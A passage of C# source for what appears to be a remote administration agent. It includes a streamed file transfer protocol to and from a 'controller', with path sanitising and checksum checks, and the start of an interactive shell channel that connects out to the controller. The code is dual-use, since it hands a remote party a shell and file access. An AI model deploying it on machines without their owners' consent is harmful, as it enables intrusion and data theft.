                    var data = File.ReadAllText(Path.Combine(entry, "stat"));
                    var close = data.LastIndexOf(')');
                    if (close < 0) continue;
                    var fields = data[(close + 2)..].Split((char[]?)null,
                        StringSplitOptions.RemoveEmptyEntries);
                    if (fields.Length < 4) continue;
                    if (!int.TryParse(fields[3], NumberStyles.Integer,
                            CultureInfo.InvariantCulture, out var session)) continue;
                    if (session != sessionId) continue;
                    if (!int.TryParse(name, out var pid)) continue;
                    Posix.kill(pid, sig);
                }
                catch { }
            }
            return;
        }
        var output = Platform.RunCapture("ps", new[] { "-axo", "pid=,sess=" }, 5);
        if (string.IsNullOrEmpty(output)) return;
        foreach (var line in output.Split('\n'))
        {
            var parts = line.Trim().Split((char[]?)null, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length < 2) continue;
            if (!int.TryParse(parts[1], out var session) || session != sessionId) continue;
            if (int.TryParse(parts[0], out var pid)) Posix.kill(pid, sig);
        }
    }

    private static void CleanupLeftoverGroup(int pid)
    {
        if (Platform.IsWindows) return;
        Posix.killpg(pid, SigHup);
    }

    private static int RunQuietCode(string exe, IEnumerable<string> args, int timeoutSeconds)
    {
        var psi = new ProcessStartInfo
        {
            FileName = exe,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        foreach (var arg in args) psi.ArgumentList.Add(arg);
        using var proc = Process.Start(psi);
        if (proc == null) return -1;
        // Drain both pipes so a chatty taskkill can never deadlock.
        _ = proc.StandardOutput.ReadToEndAsync();
        _ = proc.StandardError.ReadToEndAsync();
        if (!proc.WaitForExit(timeoutSeconds * 1000))
        {
            try { proc.Kill(true); } catch { }
            return -1;
        }
        return proc.ExitCode;
    }

    public static class Posix
    {
        [DllImport("libc", SetLastError = true)]
        public static extern int kill(int pid, int sig);

        [DllImport("libc", SetLastError = true)]
        public static extern int killpg(int pgid, int sig);

        [DllImport("libc", SetLastError = true)]
        public static extern int getpgid(int pid);

        [DllImport("libc", SetLastError = true)]
        public static extern int setsid();

        [DllImport("libc", SetLastError = true)]
        public static extern int getuid();

        [DllImport("libc", SetLastError = true)]
        public static extern int getppid();

        [DllImport("libc", SetLastError = true)]
        public static extern int execvp(string file, IntPtr[] argv);

        [DllImport("libc", SetLastError = true)]
        public static extern void _exit(int code);
    }

    private static class Kernel32
    {
        [DllImport("kernel32.dll")]
        public static extern uint GetOEMCP();

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern int MultiByteToWideChar(uint codePage, uint flags,
            byte[] multiByte, int multiByteLength, [Out] char[] wideChar, int wideCharLength);
    }
}

// ===== Transfers.cs =====
// Transfers.cs - streamed download/upload protocol. Files are never held in
// memory as a whole; the receiver writes a temporary file and atomically
// replaces the destination only after size and SHA-256 match.



public sealed class TransferFile
{
    public string Rel { get; init; } = "";
    public string Source { get; init; } = "";
    public long Size { get; init; }
    public int Mode { get; init; }
}

public sealed class TransferPlan
{
    public string Source { get; init; } = "";
    public string Kind { get; set; } = "file";
    public string Root { get; set; } = "";
    public List<JsonObject> Entries { get; } = new();
    public List<TransferFile> Files { get; } = new();
    public long TotalFiles { get; set; }
    public long TotalBytes { get; set; }
    public List<string> Warnings { get; } = new();
}

public static class TransferPaths
{
    private static readonly HashSet<string> WindowsReserved = BuildReserved();

    private static HashSet<string> BuildReserved()
    {
        var names = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "CON", "PRN", "AUX", "NUL" };
        for (var i = 1; i < 10; i++) { names.Add("COM" + i); names.Add("LPT" + i); }
        return names;
    }

    public static string ExpandHome(string path)
    {
        if (string.IsNullOrEmpty(path)) return path;
        if (path == "~") return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        if (path.StartsWith("~/", StringComparison.Ordinal) || path.StartsWith("~\\", StringComparison.Ordinal))
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), path[2..]);
        return path;
    }

    public static string? SafeTransferRel(string? value)
    {
        if (value == null) return null;
        value = value.Replace('\\', '/').Replace("\0", "");
        if (value.StartsWith("/", StringComparison.Ordinal)) value = value.TrimStart('/');
        var parts = new List<string>();
        foreach (var rawPart in value.Split('/'))
        {
            if (rawPart.Length == 0 || rawPart == ".") continue;
            if (rawPart == "..") return null;
            var cleaned = new StringBuilder();
            foreach (var ch in rawPart)
            {
                if (ch is '<' or '>' or ':' or '"' or '|' or '?' or '*' || ch < 32 || ch == '\x7f')
                    cleaned.Append('_');
                else cleaned.Append(ch);
            }
            var part = cleaned.ToString().TrimEnd(' ', '.');
            if (part.Length == 0) continue;
            if (WindowsReserved.Contains(part.Split('.', 2)[0].ToUpperInvariant()))
                part = "_" + part;
            if (part.Length > 240) return null;
            parts.Add(part);
        }
        if (parts.Count == 0) return null;
        var result = string.Join('/', parts);
        return result.Length <= 3000 ? result : null;
    }

    // .NET exposes Unix permission bits but not the file type, so a FIFO or
    // device node looks like a zero-length regular file.  Uploading such a
    // tree would block forever when the transfer opens it.  statx() is the
    // Linux answer; on other platforms File.Exists is the best portable test.
    [DllImport("libc", EntryPoint = "statx", SetLastError = true)]
    private static extern int Statx(int dirfd, [MarshalAs(UnmanagedType.LPUTF8Str)] string path,
        int flags, uint mask, [Out] byte[] statxbuf);

    public static bool IsRegularFile(string path)
    {
        if (Platform.IsLinux)
        {
            try
            {
                var buffer = new byte[256];
                // AT_FDCWD, flags 0 (follow symlinks), STATX_TYPE.
                if (Statx(-100, path, 0, 0x1, buffer) == 0)
                {
                    var mode = (ushort)(buffer[28] | (buffer[29] << 8));
                    return (mode & 0xF000) == 0x8000;
                }
                // Old kernels, seccomp filters or an unavailable libc wrapper
                // must not make every ordinary file look non-regular.
                return File.Exists(path);
            }
            catch (EntryPointNotFoundException) { }
            catch (DllNotFoundException) { }
            catch (Exception) { return File.Exists(path); }
        }
        try { return File.Exists(path); } catch { return false; }
    }

    public static bool IsLink(string path)
    {
        try
        {
            var info = new FileInfo(path);
            if (info.Exists) return info.LinkTarget != null || (info.Attributes & FileAttributes.ReparsePoint) != 0;
            var dir = new DirectoryInfo(path);
            return dir.Exists && (dir.LinkTarget != null || (dir.Attributes & FileAttributes.ReparsePoint) != 0);
        }
        catch { return false; }
    }

    public static string SafeJoinUnder(string baseDir, string rel)
    {
        var current = baseDir;
        var parts = rel.Split('/');
        for (var index = 0; index < parts.Length; index++)
        {
            current = Path.Combine(current, parts[index]);
            if (IsLink(current))
                throw new IOException("refusing to write through symlink: " + current);
            if (index == parts.Length - 1) break;
            if (Directory.Exists(current))
            {
                if (!Directory.Exists(current)) throw new IOException("not a directory: " + current);
            }
            else if (File.Exists(current))
                throw new IOException("not a directory: " + current);
            else Directory.CreateDirectory(current);
        }
        return current;
    }

    public static int FileMode(string path)
    {
        // Windows has no Unix mode bits.  Send a normal readable file mode
        // instead of zero: the controller applies this mode when saving a
        // downloaded file, and mode 0 would make the saved file unreadable.
        if (Platform.IsWindows) return 0x1A4; // 0644
        try { return (int)File.GetUnixFileMode(path); } catch { return 0; }
    }
}

public static class Transfers
{
    private static readonly Dictionary<string, CancellationTokenSource> Outgoing = new();
    private static readonly object OutgoingLock = new();
    private static readonly Dictionary<string, IncomingTransfer> Incoming = new();
    private static readonly object IncomingLock = new();

    public static string? OutgoingKey(JsonNode? id) => JsonUtil.ReqKey(id);
    public static string? IncomingKey(JsonNode? id) => JsonUtil.ReqKey(id);

    public static bool AnyActive
    {
        get
        {
            lock (OutgoingLock) if (Outgoing.Count > 0) return true;
            lock (IncomingLock) if (Incoming.Count > 0) return true;
            return false;
        }
    }

    // ---------------------------------------------------------------------
    // Download (client -> controller)
    // ---------------------------------------------------------------------

    public static TransferPlan? ScanTransferTree(string path, string? topName = null,
        CancellationToken? cancel = null)
    {
        bool Stopped() => cancel is { IsCancellationRequested: true };
        if (Stopped()) return null;
        var source = Path.GetFullPath(TransferPaths.ExpandHome(path));
        var plan = new TransferPlan { Source = source };
        if (TransferPaths.IsLink(source))
            throw new IOException("symbolic links are not sent; use the real folder");
        if (TransferPaths.IsRegularFile(source))
        {
            var info = new FileInfo(source);
            var root = TransferPaths.SafeTransferRel(topName ?? Path.GetFileName(source));
            if (string.IsNullOrEmpty(root)) throw new IOException("the file name is not safe to send");
            plan.Kind = "file";
            plan.Root = root;
            plan.Files.Add(new TransferFile
            {
                Rel = root,
                Source = source,
                Size = info.Length,
                Mode = TransferPaths.FileMode(source)
            });
            plan.TotalFiles = 1;
            plan.TotalBytes = info.Length;
            return plan;
        }
        if (!Directory.Exists(source))
            throw new IOException("not a regular file or folder");

        var trimmed = source.TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
        plan.Kind = "dir";
        plan.Root = TransferPaths.SafeTransferRel(topName ?? Path.GetFileName(trimmed)) ?? "upload";
        var seen = new HashSet<string>(StringComparer.Ordinal);

        void Walk(string dir, string relParent)
        {
            if (Stopped()) return;
            var dirs = new List<string>();
            var files = new List<string>();
            try
            {
                foreach (var entry in Directory.EnumerateFileSystemEntries(dir))
                {
                    if (Directory.Exists(entry)) dirs.Add(Path.GetFileName(entry));
                    else files.Add(Path.GetFileName(entry));
                }
            }
            catch (Exception ex)
            {
                plan.Warnings.Add($"skipped {dir}: {ex.Message}");
                return;
            }
            dirs.Sort(StringComparer.Ordinal);
            files.Sort(StringComparer.Ordinal);

            foreach (var name in dirs)
            {
                if (Stopped()) return;
                var full = Path.Combine(dir, name);
                if (TransferPaths.IsLink(full))
                {
                    plan.Warnings.Add("skipped symlink " + full);
                    continue;
                }
                var rel = TransferPaths.SafeTransferRel(
                    relParent.Length == 0 ? name : relParent + "/" + name);
                if (string.IsNullOrEmpty(rel))
                {
                    plan.Warnings.Add("skipped unsafe folder " + full);
                    continue;
                }
                if (!seen.Add(rel))
                {
                    plan.Warnings.Add("skipped colliding folder " + full);
                    continue;
                }
                plan.Entries.Add(new JsonObject { ["path"] = rel, ["kind"] = "dir" });
                Walk(full, rel);
                if (Stopped()) return;
            }

            foreach (var name in files)
            {
                if (Stopped()) return;
                var full = Path.Combine(dir, name);
                if (TransferPaths.IsLink(full))
                {
                    plan.Warnings.Add("skipped symlink " + full);
                    continue;
                }
                if (!TransferPaths.IsRegularFile(full))
                {
                    plan.Warnings.Add("skipped non-regular file " + full);
                    continue;
                }
                FileInfo info;
                try { info = new FileInfo(full); if (!info.Exists) continue; }
                catch (Exception ex)
                {
                    plan.Warnings.Add($"skipped {full}: {ex.Message}");
                    continue;
                }
                var rel = TransferPaths.SafeTransferRel(
                    relParent.Length == 0 ? name : relParent + "/" + name);
                if (string.IsNullOrEmpty(rel))
                {
                    plan.Warnings.Add("skipped unsafe name " + full);
                    continue;
                }
                if (!seen.Add(rel))
                {
                    plan.Warnings.Add("skipped colliding file " + full);
                    continue;
                }
                var mode = TransferPaths.FileMode(full);
                plan.Entries.Add(new JsonObject
                {
                    ["path"] = rel,
                    ["kind"] = "file",
                    ["size"] = info.Length,
                    ["mode"] = mode
                });
                plan.Files.Add(new TransferFile { Rel = rel, Source = full, Size = info.Length, Mode = mode });
                plan.TotalFiles++;
                plan.TotalBytes += info.Length;
            }
        }

        Walk(source, "");
        if (Stopped()) return null;
        return plan;
    }

    private static IEnumerable<List<JsonObject>> EntryBatches(List<JsonObject> entries)
    {
        var batch = new List<JsonObject>();
        var size = 0;
        foreach (var entry in entries)
        {
            var itemSize = (JsonUtil.Str(entry, "path") ?? "").Length + 96;
            if (batch.Count > 0 && (batch.Count >= Cfg.TransferEntryBatch
                                    || size + itemSize > Cfg.TransferEntryBytes))
            {
                yield return batch;
                batch = new List<JsonObject>();
                size = 0;
            }
            batch.Add(entry);
            size += itemSize;
        }
        if (batch.Count > 0) yield return batch;
    }

    public static void StartDownloadTransfer(Conn conn, JsonNode? reqId, string realPath)
    {
        var key = OutgoingKey(reqId);
        var cancel = new CancellationTokenSource();
        if (key != null)
        {
            lock (OutgoingLock)
            {
                if (Outgoing.TryGetValue(key, out var old)) old.Cancel();
                Outgoing[key] = cancel;
            }
        }
        var thread = new Thread(() =>
        {
            try { DownloadTransfer(conn, reqId, realPath, cancel); }
            catch (Exception) { /* a broken link reconnects in the main loop */ }
            finally
            {
                if (key != null)
                {
                    lock (OutgoingLock)
                        if (Outgoing.TryGetValue(key, out var current) && current == cancel)
                            Outgoing.Remove(key);
                }
                cancel.Dispose();
            }
        }) { IsBackground = true, Name = "download-transfer" };
        thread.Start();
    }

    private static void DownloadTransfer(Conn conn, JsonNode? reqId, string realPath,
        CancellationTokenSource? cancel)
    {
        bool Canceled() => cancel?.IsCancellationRequested == true;
        void StopEarly()
        {
            try
            {
                Protocol.SendMsg(conn, new JsonObject
                {
                    ["type"] = "transfer_abort",
                    ["id"] = reqId?.DeepClone(),
                    ["reason"] = "canceled by the controller"
                });
                Protocol.SendMsg(conn, new JsonObject
                {
                    ["type"] = "transfer_end",
                    ["id"] = reqId?.DeepClone()
                });
            }
            catch (IOException) { }
        }

        if (Canceled()) { StopEarly(); return; }
        TransferPlan? plan;
        try { plan = ScanTransferTree(realPath, cancel: cancel?.Token); }
        catch (Exception ex)
        {
            Protocol.SendMsg(conn, new JsonObject
            {
                ["type"] = "error",
                ["id"] = reqId?.DeepClone(),
                ["data"] = "download failed: " + ex.Message
            });
            return;
        }
        if (plan == null || Canceled()) { StopEarly(); return; }

        var streamEntries = plan.Entries.Count > 0;
        Protocol.SendMsg(conn, new JsonObject
        {
            ["type"] = "transfer_begin",
            ["id"] = reqId?.DeepClone(),
            ["direction"] = "download",
            ["kind"] = plan.Kind,
            ["root"] = plan.Root,
            ["entries"] = streamEntries ? new JsonArray() : new JsonArray(plan.Entries.Select(x => (JsonNode)x.DeepClone()).ToArray()),
            ["entries_streamed"] = streamEntries,
            ["total_files"] = plan.TotalFiles,
            ["total_bytes"] = plan.TotalBytes
        });

        long received = 0;
        try
        {
            if (streamEntries)
            {
                foreach (var batch in EntryBatches(plan.Entries))
                {
                    if (Canceled()) { StopEarly(); return; }
                    var entries = new JsonArray();
                    foreach (var entry in batch) entries.Add(entry.DeepClone());
                    Protocol.SendMsg(conn, new JsonObject
                    {
                        ["type"] = "transfer_entries",
                        ["id"] = reqId?.DeepClone(),
                        ["entries"] = entries
                    });
                }
            }

            foreach (var file in plan.Files)
            {
                if (Canceled()) { StopEarly(); return; }
                Protocol.SendMsg(conn, new JsonObject
                {
                    ["type"] = "transfer_file_begin",
                    ["id"] = reqId?.DeepClone(),
                    ["path"] = file.Rel,
                    ["size"] = file.Size,
                    ["mode"] = file.Mode
                });
                using var digest = IncrementalHash.CreateHash(HashAlgorithmName.SHA256);
                long sent = 0;
                try
                {
                    using var stream = new FileStream(file.Source, FileMode.Open, FileAccess.Read,
                        FileShare.ReadWrite, Cfg.TransferChunk, FileOptions.SequentialScan);
                    var buffer = new byte[Cfg.TransferChunk];
                    while (true)
                    {
                        if (Canceled()) { StopEarly(); return; }
                        var n = stream.Read(buffer, 0, buffer.Length);
                        if (n <= 0) break;
                        digest.AppendData(buffer, 0, n);
                        sent += n;
                        Protocol.SendMsg(conn, new JsonObject
                        {
                            ["type"] = "transfer_chunk",
                            ["id"] = reqId?.DeepClone(),
                            ["data"] = Convert.ToBase64String(buffer, 0, n)
                        });
                        if (sent > 0 && sent % (8 * 1024 * 1024) < Cfg.TransferChunk)
                        {
                            Protocol.SendMsg(conn, new JsonObject
                            {
                                ["type"] = "transfer_progress",
                                ["id"] = reqId?.DeepClone(),
                                ["received"] = received + sent,
                                ["total"] = plan.TotalBytes
                            });
                        }
                    }
                }
                catch (Exception ex) when (ex is IOException or UnauthorizedAccessException)
                {
                    Protocol.SendMsg(conn, new JsonObject
                    {
                        ["type"] = "transfer_abort",
                        ["id"] = reqId?.DeepClone(),
                        ["reason"] = $"could not read {file.Source}: {ex.Message}"
                    });
                    Protocol.SendMsg(conn, new JsonObject
                    {
                        ["type"] = "transfer_end",
                        ["id"] = reqId?.DeepClone()
                    });
                    return;
                }
                Protocol.SendMsg(conn, new JsonObject
                {
                    ["type"] = "transfer_file_end",
                    ["id"] = reqId?.DeepClone(),
                    ["path"] = file.Rel,
                    ["size"] = sent,
                    ["hash"] = Convert.ToHexString(digest.GetHashAndReset()).ToLowerInvariant()
                });
                received += sent;
            }
            Protocol.SendMsg(conn, new JsonObject
            {
                ["type"] = "transfer_end",
                ["id"] = reqId?.DeepClone()
            });
        }
        catch (IOException) { throw; }
    }

    public static bool OutgoingCancel(JsonNode? reqId)
    {
        var key = OutgoingKey(reqId);
        if (key == null) return false;
        CancellationTokenSource? source;
        lock (OutgoingLock) Outgoing.TryGetValue(key, out source);
        if (source == null) return false;
        source.Cancel();
        return true;
    }

    public static void AbortOutgoingTransfers()
    {
        List<CancellationTokenSource> sources;
        lock (OutgoingLock)
        {
            sources = Outgoing.Values.ToList();
            Outgoing.Clear();
        }
        foreach (var source in sources)
        {
            try { source.Cancel(); } catch { }
        }
    }

    public static void ServeDownloadRequest(Conn conn, JsonObject msg, JsonNode? reqId,
        string currentDir)
    {
        var rawPath = JsonUtil.Str(msg, "path") ?? "";
        var path = TransferPaths.ExpandHome(rawPath);
        var realPath = Path.IsPathRooted(path) ? path : Path.Combine(currentDir, path);
        try
        {
            var info = new FileInfo(realPath);
            var isDir = Directory.Exists(realPath);
            var isFile = TransferPaths.IsRegularFile(realPath);
            if (isDir || JsonUtil.Bool(msg, "stream") || !isFile
                || info.Length > (Cfg.MaxMsg * 3L) / 4)
            {
                if (!isDir && !isFile) throw new IOException("not a regular file or folder");
                StartDownloadTransfer(conn, reqId, realPath);
                return;
            }
            var limit = (Cfg.MaxMsg * 3L) / 4;
            var bytes = File.ReadAllBytes(realPath);
            if (bytes.Length > limit)
            {
                StartDownloadTransfer(conn, reqId, realPath);
                return;
            }
            Protocol.SendMsg(conn, new JsonObject
            {
                ["type"] = "file",
                ["id"] = reqId?.DeepClone(),
                ["name"] = Path.GetFileName(realPath),
                ["data"] = Convert.ToBase64String(bytes)
            });
        }
        catch (Exception ex)
        {
            try
            {
                Protocol.SendMsg(conn, new JsonObject
                {
                    ["type"] = "error",
                    ["id"] = reqId?.DeepClone(),
                    ["data"] = "download failed: " + ex.Message
                });
            }
            catch (IOException) { }
        }
    }

    // ---------------------------------------------------------------------
    // Upload (controller -> client)
    // ---------------------------------------------------------------------

    public static void IncomingBegin(JsonObject msg, JsonNode? reqId, string currentDir)
    {
        var key = IncomingKey(reqId);
        if (key == null) return;
        IncomingTransfer? old;
        lock (IncomingLock)
        {
            Incoming.TryGetValue(key, out old);
            Incoming.Remove(key);
        }
        old?.DiscardFile();
        var state = new IncomingTransfer(msg, currentDir);
        lock (IncomingLock) Incoming[key] = state;
    }

    public static IncomingTransfer? IncomingDrop(JsonNode? reqId)
    {
        var key = IncomingKey(reqId);
        if (key == null) return null;
        lock (IncomingLock)
        {
            Incoming.TryGetValue(key, out var state);
            Incoming.Remove(key);
            return state;
        }
    }

    public static void AbortIncomingTransfers()
    {
        List<IncomingTransfer> states;
        lock (IncomingLock)
        {
            states = Incoming.Values.ToList();
            Incoming.Clear();
        }
        foreach (var state in states) state.DiscardFile();
    }

    public static void HandleTransferMessage(Conn conn, JsonObject msg, JsonNode? reqId,
        string currentDir)
    {
        var mtype = JsonUtil.Str(msg, "type");
        if (mtype == "transfer_begin")
        {
            IncomingBegin(msg, reqId, currentDir);
            return;
        }
        var key = IncomingKey(reqId);
        IncomingTransfer? state = null;
        if (key != null)
            lock (IncomingLock) Incoming.TryGetValue(key, out state);
        if (state == null) return;
        switch (mtype)
        {
            case "transfer_entries":
                state.AddEntries(msg);
                break;
            case "transfer_file_begin":
                state.EndFile();
                state.StartFile(msg);
                break;
            case "transfer_chunk":
                var fast = Protocol.TakeFastChunk(msg);
                if (fast != null) state.AddChunkBytes(fast);
                else state.AddChunk(JsonUtil.Get(msg, "data"));
                break;
            case "transfer_file_end":
                state.EndFile(msg);
                break;
            case "transfer_abort":
                state.Abort(msg);
                break;
            case "transfer_end":
                var finished = IncomingDrop(reqId);
                if (finished != null)
                {
                    var (replyType, text) = finished.Finish();
                    Protocol.SendMsg(conn, new JsonObject
                    {
                        ["type"] = replyType,
                        ["id"] = reqId?.DeepClone(),
                        ["data"] = text
                    });
                }
                break;
        }
    }
}

public sealed class IncomingTransfer
{
    public string Kind;
    public List<JsonObject> Entries = new();
    public long TotalFiles;
    public long TotalBytes;
    public long Received;
    public long FilesDone;
    public string Error = "";
    private FileStream? _handle;
    private string? _tmp;
    private string? _target;
    private long _expectedSize;
    private string _expectedHash = "";
    private IncrementalHash? _digest;
    private int? _mode;
    private string? _base;
    private string? _singleTarget;
    private readonly HashSet<string> _seenTargets = new(StringComparer.Ordinal);

    public IncomingTransfer(JsonObject msg, string currentDir)
    {
        Kind = JsonUtil.Str(msg, "kind") == "dir" ? "dir" : "file";
        if (JsonUtil.Get(msg, "entries") is JsonArray entries)
            Entries = entries.OfType<JsonObject>().ToList();
        TotalFiles = Math.Max(0, JsonUtil.Long(msg, "total_files"));
        TotalBytes = Math.Max(0, JsonUtil.Long(msg, "total_bytes"));
        var root = TransferPaths.SafeTransferRel(JsonUtil.Str(msg, "root") ?? "");
        if (string.IsNullOrEmpty(root))
        {
            Error = "the controller sent an unsafe destination name";
            return;
        }
        try
        {
            if (Kind == "dir")
            {
                _base = TransferPaths.SafeJoinUnder(currentDir, root);
                if (!Directory.Exists(_base)) Directory.CreateDirectory(_base);
                AddEntries(msg);
            }
            else
            {
                _singleTarget = TransferPaths.SafeJoinUnder(currentDir, root);
                if (Directory.Exists(_singleTarget))
                    Error = "destination is a folder: " + _singleTarget;
            }
        }
        catch (Exception ex) { Error = ex.Message; }
    }

    public void AddEntries(JsonObject msg)
    {
        if (Error.Length > 0 || Kind != "dir" || string.IsNullOrEmpty(_base)) return;
        if (JsonUtil.Get(msg, "entries") is not JsonArray entries) return;
        try
        {
            foreach (var node in entries)
            {
                if (node is not JsonObject entry || JsonUtil.Str(entry, "kind") != "dir") continue;
                var rel = TransferPaths.SafeTransferRel(JsonUtil.Str(entry, "path"));
                if (string.IsNullOrEmpty(rel)) continue;
                var folder = TransferPaths.SafeJoinUnder(_base!, rel);
                if (!Directory.Exists(folder)) Directory.CreateDirectory(folder);
            }
        }
        catch (Exception ex) { Error = ex.Message; }
    }

    public void StartFile(JsonObject msg)
    {
        if (Error.Length > 0) return;
        var rel = TransferPaths.SafeTransferRel(JsonUtil.Str(msg, "path"));
        if (string.IsNullOrEmpty(rel))
        {
            Error = "the controller sent an unsafe file path";
            return;
        }
        _expectedSize = Math.Max(0, JsonUtil.Long(msg, "size"));
        _expectedHash = JsonUtil.Str(msg, "hash") ?? "";
        try { _mode = (int)JsonUtil.Long(msg, "mode") & 0x1FF; }
        catch { _mode = null; }
        string? target = null;
        try
        {
            if (Kind == "file")
            {
                target = _singleTarget;
                if (target == null) throw new IOException("no destination for this file");
            }
            else target = TransferPaths.SafeJoinUnder(_base!, rel);
            var identity = OperatingSystem.IsWindows()
                ? Path.GetFullPath(target).ToLowerInvariant()
                : Path.GetFullPath(target);
            if (!_seenTargets.Add(identity))
            {
                Error = "duplicate destination path: " + rel;
                return;
            }
            _target = target;
            var parent = Path.GetDirectoryName(target) ?? Directory.GetCurrentDirectory();
            _tmp = Path.Combine(parent, ".cmon-in-" + Convert.ToHexString(RandomNumberGenerator.GetBytes(8)).ToLowerInvariant());
            _handle = new FileStream(_tmp, FileMode.CreateNew, FileAccess.Write, FileShare.None,
                65536, FileOptions.SequentialScan);
            _digest = IncrementalHash.CreateHash(HashAlgorithmName.SHA256);
        }
        catch (Exception ex)
        {
            Error = $"could not create {target ?? rel}: {ex.Message}";
            DiscardFile();
        }
    }

    public void AddChunk(JsonNode? dataNode)
    {
        if (Error.Length > 0 || _handle == null) return;
        byte[] raw;
        try
        {
            var text = dataNode is JsonValue v && v.TryGetValue<string>(out var s) ? s : "";
            raw = Convert.FromBase64String(text);
        }
        catch
        {
            Error = "invalid base64 in transfer";
            DiscardFile();
            return;
        }
        AddChunkBytes(raw);
    }

    public void AddChunkBytes(byte[] raw)
    {
        if (Error.Length > 0 || _handle == null) return;
        if (raw.Length == 0 || raw.Length > Cfg.MaxTransferChunk)
        {
            Error = "invalid transfer chunk size";
            DiscardFile();
            return;
        }
        try
        {
            _handle.Write(raw, 0, raw.Length);
            _digest?.AppendData(raw);
            Received += raw.Length;
        }
        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException)
        {
            Error = "write failed: " + ex.Message;
            DiscardFile();
        }
    }

    public void EndFile(JsonObject? msg = null)
    {
        if (_handle == null) return;
        try { _handle.Flush(flushToDisk: true); } catch { }
        try { _handle.Dispose(); } catch { }
        _handle = null;
        var digest = _digest != null ? Convert.ToHexString(_digest.GetHashAndReset()).ToLowerInvariant() : "";
        var ok = Error.Length == 0;
        if (ok)
        {
            long actual = -1;
            try { actual = new FileInfo(_tmp!).Length; } catch { }
            if (actual != _expectedSize)
            {
                ok = false;
                Error = $"size mismatch for {_target} (expected {_expectedSize}, got {actual})";
            }
            if (ok && _expectedHash.Length > 0 && digest != _expectedHash)
            {
                ok = false;
                Error = $"checksum mismatch for {_target}";
            }
        }
        if (ok)
        {
            if (_mode != null && !OperatingSystem.IsWindows())
            {
                try { File.SetUnixFileMode(_tmp!, (UnixFileMode)_mode.Value); } catch { }
            }
            try
            {
                File.Move(_tmp!, _target!, overwrite: true);
                _tmp = null;
                FilesDone++;
            }
            catch (Exception ex) when (ex is IOException or UnauthorizedAccessException)
            {
                ok = false;
                Error = $"could not save {_target}: {ex.Message}";
            }
        }
        if (!ok) DiscardFile();
        _expectedSize = 0;
        _expectedHash = "";
        _digest?.Dispose();
        _digest = null;
    }

    public void Abort(JsonObject msg)
    {
        if (Error.Length == 0)
            Error = JsonUtil.Str(msg, "reason") ?? "the controller aborted the transfer";
        DiscardFile();
    }

    public void DiscardFile()
    {
        if (_handle != null)
        {
            try { _handle.Dispose(); } catch { }
            _handle = null;
        }
        if (!string.IsNullOrEmpty(_tmp))
        {
            try { File.Delete(_tmp!); } catch { }
            _tmp = null;
        }
        _digest?.Dispose();
        _digest = null;
    }

    public (string Type, string Text) Finish()
    {
        if (_handle != null && Error.Length == 0)
            Error = "the transfer ended in the middle of a file";
        DiscardFile();
        if (Error.Length == 0)
        {
            if (Kind == "file" && FilesDone != 1) Error = "the file was not completed";
            else if (Kind == "dir" && TotalFiles > 0 && FilesDone != TotalFiles)
                Error = $"upload incomplete ({FilesDone} of {TotalFiles} files)";
        }
        if (Error.Length > 0) return ("error", "upload failed: " + Error);
        var where = Kind == "dir" ? _base : _singleTarget;
        return ("output", $"Saved to {where} ({FilesDone} file{(FilesDone == 1 ? "" : "s")}, {Received} bytes)");
    }
}

// ===== Shell.cs =====
// Shell.cs - interactive shell channel. Unix gets a real PTY (the script(1)
// adapter owns the pty and gives the child job control); Windows uses ConPTY
// with a real CTRL_C_EVENT helper and a bounded, priority-aware input writer.
// A pipe fallback is kept for locked-down Windows hosts where ConPTY is absent.



public static class Shell
{
    public const int ShellConnectTimeout = 25;
    public const int ShellHandshakeTimeout = 20;

    private static readonly object Gate = new();
    private static bool _busy;
    private static Conn? _conn;
    private static Thread? _thread;
    private static CancellationTokenSource? _cancel;

    public static bool IsRunning
    {
        get { lock (Gate) return _busy; }
    }

    public static bool StopShell(double wait = 1.0)
    {
        Conn? conn;
        Thread? thread;
        CancellationTokenSource? cancel;
        lock (Gate)
        {
            conn = _conn;
            thread = _thread;
            cancel = _cancel;
            var active = conn != null || thread != null;
            if (!active) return false;
            try { cancel?.Cancel(); } catch { }
        }
        if (conn != null)
        {
            try { conn.ShutdownBoth(); } catch { }
            try { conn.Close(); } catch { }
        }
        if (thread != null && thread != Thread.CurrentThread)
        {
            try { thread.Join(TimeSpan.FromSeconds(Math.Max(0, wait))); } catch { }
        }
        lock (Gate)
        {
            if (_conn == conn) _conn = null;
            if (_thread == thread && thread != null && !thread.IsAlive) _thread = null;
        }
        return true;
    }

    public static void StartInteractiveShell(Conn control, string host, int port,
        string scheme, string token, JsonNode? reqId)
    {
        CancellationTokenSource cancel;
        Thread thread;
        lock (Gate)
        {
            if (_busy)
            {
                Protocol.SendMsg(control, new JsonObject
                {
                    ["type"] = "error",
                    ["id"] = reqId?.DeepClone(),
                    ["data"] = "an interactive shell is already running"
                });
                return;
            }
            _busy = true;
            _cancel?.Dispose();
            _cancel = cancel = new CancellationTokenSource();
            thread = new Thread(() => Worker(host, port, scheme, token, cancel))
            {
                IsBackground = true,
                Name = "interactive-shell"
            };
            _thread = thread;
        }
        try { thread.Start(); }
        catch (Exception ex)
        {
            lock (Gate)
            {
                _busy = false;
                _thread = null;
                try { _cancel?.Cancel(); } catch { }
            }
            Protocol.SendMsg(control, new JsonObject
            {
                ["type"] = "error",
                ["id"] = reqId?.DeepClone(),
                ["data"] = "shell: " + ex.Message
            });
        }
    }

    private static void Worker(string host, int port, string scheme, string token,
        CancellationTokenSource cancel)
    {
        Conn? sock = null;
        try
        {
            if (cancel.IsCancellationRequested) return;
            try
            {
                sock = Transports.ConnectShell(host, port, scheme, token, cancel.Token);
            }
            catch (Exception ex)
            {
                if (!cancel.IsCancellationRequested)
                    Log.Error("[!] shell: could not reach the controller shell channel: " + ex.Message);
                return;
            }
            lock (Gate)
            {
                if (cancel.IsCancellationRequested)
                {
                    try { sock.Close(); } catch { }
                    return;
                }
                _conn = sock;
            }

            var header = new byte[4];
            if (Protocol.RecvExact(sock, header, 0, 4, false,
                    DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 + ShellHandshakeTimeout) != 4)
                throw new IOException("peer closed during handshake");
            var rows = (header[0] << 8) | header[1];
